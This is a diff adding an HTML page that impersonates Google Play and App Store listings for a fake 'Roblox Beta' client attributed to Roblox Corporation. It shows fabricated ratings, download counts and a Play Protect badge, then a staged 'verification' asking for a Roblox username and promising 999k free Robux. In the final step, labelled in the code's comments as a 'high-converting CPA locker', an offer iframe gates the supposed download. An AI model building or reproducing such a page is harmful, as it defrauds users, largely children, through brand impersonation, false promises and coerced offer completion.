@@ -1,0 +1,201 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox Beta - Mobile Client</title>
+    <link rel="icon" href="https://i.imgur.com/P3pSdUo.png" type="image/x-icon">
+    <link href="fonts.googleapis.com/css2" rel="stylesheet">
+
+    
+<link rel="stylesheet" type="text/css" href="mfidniedemcgceagapgdekdbmanojomk/css/content_shared.css"><link rel="stylesheet" type="text/css" href="mfidniedemcgceagapgdekdbmanojomk/css/content_lite.css"><link rel="stylesheet" href="css/inline_styles.css"></head>
+<body>
+
+    <div class="main-wrapper">
+
+        <!-- ========================================================
+             VIEW A: ANDROID (GOOGLE PLAY)
+             ======================================================== -->
+        <div id="android-view" class="android-body" style="display: block;">
+            <div class="gp-header">
+                <div class="gp-logo">
+                    <svg viewBox="0 0 24 24">
+                        <path fill="#4285F4" d="M3.6 1.8L13.5 12 3.6 22.2c-.4-.3-.6-.8-.6-1.4V3.2c0-.6.2-1.1.6-1.4z"></path>
+                        <path fill="#34A853" d="M16.9 8.6L13.5 12l3.4 3.4 3.8-2.2c.7-.4.7-1.1 0-1.5l-3.8-2.1z"></path>
+                        <path fill="#FBBC05" d="M3.6 1.8l10 10.2 3.3-3.4L6.2.8C5.2.2 4.2.6 3.6 1.8z"></path>
+                        <path fill="#EA4335" d="M3.6 22.2l13.3-7.8-3.4-3.4-9.9 10.2c.6 1.2 1.6 1.6 2.6 1z"></path>
+                    </svg>
+                    Google Play
+                </div>
+            </div>
+
+            <div class="app-header">
+                <img class="app-icon" src="i.imgur.com/zgp9hzk.png" alt="Roblox Beta Icon">
+                <div class="app-info">
+                    <h1 class="app-title">Roblox Beta</h1>
+                    <span class="app-developer">Roblox Corporation</span>
+                    <span class="app-tag">Early Access • Official Release</span>
+                </div>
+            </div>
+
+            <div class="stats-row">
+                <div class="stat-item">
+                    <span class="stat-val">4.5 ★</span>
+                    <span class="stat-lbl">52M reviews</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="stat-item">
+                    <span class="stat-val">148 MB</span>
+                    <span class="stat-lbl">Size</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="stat-item">
+                    <span class="stat-val">Rated 12+</span>
+                    <span class="stat-lbl">Parental guidance</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="stat-item">
+                    <span class="stat-val">500M+</span>
+                    <span class="stat-lbl">Downloads</span>
+                </div>
+            </div>
+
+            <div id="androidActionArea">
+                <button class="btn-install-android" id="androidInstallBtn">Install (148 MB)</button>
+            </div>
+
+            <div class="download-box" id="androidDownloadBox">
+                <div class="dl-status-row">
+                    <span id="androidDlStatus">Pending...</span>
+                    <span id="androidDlPercent">0%</span>
+                </div>
+                <div class="progress-track">
+                    <div class="progress-fill" id="androidProgressFill"></div>
+                </div>
+            </div>
+
+            <div class="play-protect-badge">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path>
+                </svg>
+                <span>Verified by Play Protect</span>
+            </div>
+        </div>
+
+
+        <!-- ========================================================
+             VIEW B: IPHONE / iOS (APPLE APP STORE)
+             ======================================================== -->
+        <div id="ios-view" class="ios-body">
+            <div class="ios-app-header">
+                <img class="ios-app-icon" src="i.imgur.com/zgp9hzk.png" alt="Roblox Beta Icon">
+                <div class="ios-app-info">
+                    <h1 class="ios-app-title">Roblox Beta</h1>
+                    <span class="ios-app-developer">Roblox Corporation</span>
+                    <span class="ios-app-sub">Early Access Client • Adventure</span>
+                </div>
+            </div>
+
+            <!-- Prominent Full-Width Apple Button -->
+            <div class="ios-btn-wrap" id="iosActionArea">
+                <button class="btn-install-ios" id="iosInstallBtn">INSTALL (FREE)</button>
+            </div>
+
+            <div class="download-box" id="iosDownloadBox">
+                <div class="dl-status-row">
+                    <span id="iosDlStatus">Preparing TestFlight...</span>
+                    <span id="iosDlPercent">0%</span>
+                </div>
+                <div class="progress-track">
+                    <div class="progress-fill ios-bar" id="iosProgressFill"></div>
+                </div>
+            </div>
+
+            <div class="ios-stats-row">
+                <div class="ios-stat-item">
+                    <span class="ios-stat-top">Ratings</span>
+                    <span class="ios-stat-val">4.6 ★</span>
+                    <span class="ios-stat-sub">4.3M Reviews</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="ios-stat-item">
+                    <span class="ios-stat-top">Age</span>
+                    <span class="ios-stat-val">12+</span>
+                    <span class="ios-stat-sub">Years Old</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="ios-stat-item">
+                    <span class="ios-stat-top">Chart</span>
+                    <span class="ios-stat-val">#1</span>
+                    <span class="ios-stat-sub">Adventure</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="ios-stat-item">
+                    <span class="ios-stat-top">Size</span>
+                    <span class="ios-stat-val">148 MB</span>
+                    <span class="ios-stat-sub">Verified</span>
+                </div>
+            </div>
+        </div>
+
+
+        <!-- ========================================================
+             SHARED STEP 2: 99% VERIFICATION CONTAINER
+             ======================================================== -->
+        <div class="verify-card" id="verifyCard">
+            <h3 class="verify-title">⚠️ Verify Roblox Player Account</h3>
+            <p>Roblox Beta is reserved for active community players. Enter your Roblox username to verify your account and claim Roblox Beta.</p>
+
+            <div class="input-group">
+                <input type="text" class="input-username" id="usernameInput" placeholder="Enter Roblox username">
+                <button class="btn-search" id="searchBtn">Find</button>
+            </div>
+
+            <div class="player-found" id="playerFound">
+                <img class="player-avatar" id="playerAvatar" src="i.imgur.com/b5r44kl.png" alt="Avatar">
+                <div class="player-meta">
+                    <div class="player-name" id="playerName">Username</div>
+                    <div class="player-id" id="playerId">ID: #0000000</div>
+                    <div class="player-tag">✔ Verified Player Account Found</div>
+                </div>
+            </div>
+
+            <button class="btn-confirm" id="confirmBtn">Confirm Account &amp; Unlock Beta</button>
+
+            <div class="checking-box" id="checkingBox">
+                <div class="spinner" id="loadingSpinner"></div>
+                <div style="font-weight: 600; font-size: 14px;">Authorizing Beta Access &amp; Tester Perks...</div>
+            </div>
+        </div>
+
+
+        <!-- ========================================================
+             SHARED STEP 3: HIGH-CONVERTING CPA LOCKER SECTION
+             ======================================================== -->
+        <div class="locker-card" id="lockerCard">
+            
+            <div class="robux-perk-box">
+                <div class="robux-reward-title">
+                    🎁 <img src="i.imgur.com/vcawh9d.png" alt="Robux" class="robux-icon"> Roblox Beta Reward: 999k Robux
+                </div>
+                <div class="robux-reward-sub" id="robuxRecipientText">
+                    Ready to be delivered to your account
+                </div>
+            </div>
+
+            <div class="locker-notice-box">
+                Choose an offer below and click it. Follow each step of the offer carefully. Once you finish the offer and see <b>‘Offer Completed’</b>, your <b>Roblox Beta download and Robux</b> will unlock immediately.
+            </div>
+
+            <div class="locker-frame-wrap">
+                <iframe class="locker-frame" id="lockerFrame" src="" title="Verification Locker"></iframe>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ========================================================
+         SCRIPT: AUTO-DETECTION, DOWNLOAD LOOP & LOCKER
+         ======================================================== -->
+    
+
+
+<script src="js/inline_scripts.js"></script></body></html>
